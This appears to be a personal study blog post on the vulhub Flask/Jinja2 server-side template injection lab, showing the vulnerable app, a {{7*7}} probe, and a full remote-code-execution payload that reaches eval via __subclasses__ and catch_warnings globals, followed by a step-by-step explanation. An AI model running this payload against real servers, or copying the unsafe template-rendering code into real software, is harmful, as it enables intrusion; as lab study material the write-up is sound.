---
title: "Flask SSTI: From Template Injection to Code Execution"
published: 2026-04-28
tags: [CVE, vulhub, study, flask]
category: CVE
draft: false
---

# Description
Flask is a popular Python web framework that uses Jinja2 as its template engine. A Server-Side Template Injection (SSTI) vulnerability can occur when user input is directly rendered in Jinja2 templates without proper sanitization, potentially leading to remote code execution.

> SSTI caused by Jinja2

**SSTI**: When user input values ​​are inserted into an existing template.
Perform arbitrary actions by inserting malicious payload using these syntax.

This study uses Flask because its compact implementation makes the path from template injection to code execution comparatively easy to trace. The objective is to connect the proof of concept to the underlying object traversal rather than stopping at payload execution.

---
# Environment Setup

`docker-compose.yml`
```yml
services:
 web:
   image: vulhub/flask:1.1.1
   volumes:
    -./src:/app
   ports:
    - "8000:8000"
```

```
docker compose up -d
```

Afterwards, when you visit `http://your-ip:8000/`, you will see the default page.

If we look at one given file, `app.py`:
```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()
```
You can see the contents above.

Take the value of `name` among `args` that is included in `url`.
It seems to be rendered as is in the template.

The default is `guest`.

---
# Exploit
All you have to do is know the grammar used in the template and apply it to perform malicious actions.
Ah, I should write this quickly and go see the magic circle,...

What was that, a year and a half ago? I remember `GPT` telling me to include {{7 * 7}} << when testing **SSTI**.

So I am going to use that one.
```
http://your-ip:8000/?name={{7*7}}
```

Once you enter, you can see that the calculation results are reflected!

<a href="https://imgbb.com/"><img src="https://i.ibb.co/sdB3JhFx/2026-04-28-191916.png" alt="screenshot 2026 04 28 191916" border="0"></a>

Therefore, run Python code using the `eval()` function as follows:
`PoC` code can be written

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
If you just put this into `url` (with the value of `name`)

<a href="https://ibb.co/pBHbNh06"><img src="https://i.ibb.co/KptbBK0c/2026-04-28-192159.png" alt="2026-04-28-192159" border="0"></a>
This confirms the expected behavior.

---
# Root-Cause Analysis
I was a bit curious about this.
Why are you calling `PoC` like that?
No matter how much you follow the template engine syntax, isn't this a bit unexpected?
that is right, I still do not want to see the % end, what about %

The mixing of Python syntax within {} seems very strange.
Okay, It remains unclear where it ends.

In fact, is it because I have bad memories of short coding that my aversion to it has gotten a bit worse?

no. I just did not want to interpret it, so I was forcing it. hmm,
I'll keep going

The reason is that `os.system()` cannot be called directly.
However, the fact is that it is possible to enter by detour.

---
```python
{% for c in [].__class__.__base__.__subclasses__() %}
```
If you take an empty list and find its class, you get `list`.
`base` of `list` is the parent class `object`,
`subclasses` returns a subclass.

In other words, it is a collection of everything under `object` in Python~ something like this.

```python
{% if c.__name__ == 'catch_warnings' %}
```
By traversing as above, we find cases where the name is `catch_warnings`.
To be precise, we are after a class with that name.

Why? There appear are still a lot of objects left, narrowing them down already is not enough, and there are still more left to see the useful ones.

But it feels a bit like a convention... I need to study it separately;;

---
```python
{% for b in c.__init__.__globals__.values() %}
```
Take `catch_warnings.__init__` and extract the values ​​from `globals`.
`__globals__` friend is an attribute and a dictionary containing the global namespace of the module in which a function is defined.

ex)
```python
base_value = 100  # global variable

def my_func():
    return base_value

# of function object __globals__ Check
print(my_func.__globals__['base_value'])
```

---
```python
{% if b.__class__ == {}.__class__ %}
```
He just checks to see if it matches the class of the dictionary, and does not care if it is a dictionary.

```python
{% if 'eval' in b.keys() %}
```
Find the key `eval` in the filtered dictionary
It seems like an attempt to find a dictionary of built-in functions.

```python
{{ b['eval']('__import__("os").popen("id").read()') }}
```
b['eval'] is jinja2, and its contents are set to `python`.
Its role is to render execution results,
Python scripts are used indirectly.

As mentioned before, if you do not use indirect expressions, you will be kicked out of the sandbox.
Inevitably builtin grammar..? What do they say about this? Anyway, only the internal function friends use it well.
Bring it as if you are turning it upside down.

---
# Reviews

Ugh... it is hard to do 5 things a day. Even tomorrow is the middle day.
I am not good at studying, and I am not even the type of person who works hard.
I infer that talking about exams falls under opinions 1 and 2.

Still, unwanted tests are sometimes quite painful.
Slurp..

I will write the rest well as well.

Additional Dreamhack case studies will be documented separately.
